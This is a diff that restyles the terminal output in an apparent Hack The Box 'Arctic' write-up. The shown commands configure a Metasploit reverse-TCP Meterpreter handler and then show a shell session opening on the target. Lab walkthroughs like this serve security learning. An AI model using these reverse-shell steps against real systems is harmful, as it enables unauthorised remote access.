@@ -79,17 +79,17 @@ categories:
 <div style="height:300px;width:600px;overflow:auto;background-color:#262626;color:White;scrollbar-base-color:gold;font-family:monospace;padding:10px;">
  
 <p>msf > use exploit/multi/handler 
-<br>msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+<br>msf exploit(<font color="red">multi/handler</font>) > set payload windows/meterpreter/reverse_tcp
 <br>payload => windows/meterpreter/reverse_tcp
-<br>msf exploit(multi/handler) > set LHOST 10.*.*.10
+<br>msf exploit(<font color="red">multi/handler</font>) > set LHOST 10.*.*.10
 <br>LHOST => 10.10.14.10
-<br>msf exploit(multi/handler) > set LPORT 4455
+<br>msf exploit(<font color="red">multi/handler</font>) > set LPORT 4455
 <br>LPORT => 4455
-<br>msf exploit(multi/handler) > exploit</p>
+<br>msf exploit(<font color="red">multi/handler</font>) > exploit</p>
 
-<p>[*] Started reverse TCP handler on 10.*.*.10:4455 
-<br>[*] Sending stage (179779 bytes) to 10.10.10.11
-<br>[*] Meterpreter session 1 opened (10.*.*.10:4455 - 10.10.10.11:51379) at 2018-05-31 13:47:39 -0400</p>
+<p><font color="RoyalBlue">[*]</font> Started reverse TCP handler on 10.*.*.10:4455 
+<br><font color="RoyalBlue">[*]</font> Sending stage (179779 bytes) to 10.10.10.11
+<br><font color="RoyalBlue">[*]</font> Meterpreter session 1 opened (10.*.*.10:4455 - 10.10.10.11:51379) at 2018-05-31 13:47:39 -0400</p>
 
 <p>meterpreter > getuid 
 <br>Server username: ARCTIC\tolis
